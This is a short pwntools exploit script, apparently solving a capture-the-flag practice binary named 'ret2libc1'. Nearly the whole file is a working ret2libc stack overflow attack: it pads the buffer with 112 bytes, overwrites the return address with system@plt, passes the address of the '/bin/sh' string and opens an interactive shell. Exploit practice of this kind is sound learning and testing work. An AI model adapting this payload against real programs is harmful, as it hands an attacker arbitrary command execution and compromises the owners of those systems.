from pwn import *
sh = process(['/home/uniquer/code/pwn/binary/ret2libc1'])
# binsh_addr = 0x8048720
# system_plt = 0x08048460
elf = ELF('/home/uniquer/code/pwn/binary/ret2libc1')
system_plt = elf.plt["system"]
bin_sh = next(elf.search(b'/bin/sh'))
# payload = flat([b'a' * 112, system_plt, b'b' * 4, binsh_addr])
payload = b'A' * 112 + p32(system_plt) + b'AAAA' + p32(bin_sh)
sh.sendline(payload)
sh.interactive()
